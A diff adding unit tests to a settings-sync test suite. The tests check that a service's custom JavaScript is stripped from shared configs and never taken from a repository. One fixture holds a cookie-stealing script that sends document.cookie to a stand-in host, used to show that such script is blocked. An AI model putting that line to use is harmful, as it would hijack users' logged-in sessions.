@@ -62,6 +62,27 @@ describe('what travels', () => {
     expect(portable(config())).not.toHaveProperty('pushRegistrations');
   });
 
+  it('NEVER CARRIES A SERVICE\'S CUSTOM JAVASCRIPT — anyone who can push would run script in your Gmail', () => {
+    const withJs = config({ services: [{ ...svc('one'), customJs: 'fetch("https://x.test/?c="+document.cookie)' }, svc('two')] });
+    const out = serialise(withJs);
+    expect(out).not.toContain('customJs');
+    expect(out).not.toContain('document.cookie');
+    // The rest of the service still travels.
+    expect((portable(withJs).services ?? []).map((s) => s.id)).toEqual(['one', 'two']);
+  });
+
+  it('an incoming config keeps THIS machine\'s custom JavaScript, and never adopts a repo\'s', () => {
+    const local = config({ services: [{ ...svc('one'), customJs: 'mine()' }, svc('two')] });
+    const incoming = portable(config()) as ReturnType<typeof portable>;
+    // As if the repo had been edited to carry script for both services.
+    for (const s of incoming.services) (s as { customJs?: string }).customJs = 'theirs()';
+
+    const restored = restoreLocalPreferences(incoming, local);
+    const byId = Object.fromEntries(restored.services.map((s) => [s.id, s.customJs]));
+    expect(byId['one']).toBe('mine()');
+    expect(byId['two']).toBeUndefined();
+  });
+
   it('never carries window bounds or layouts — both are display-shaped', () => {
     // A 4-pane split from a 32" monitor is unusable on a 13" laptop, and restoreBounds would
     // strand the window offscreen.
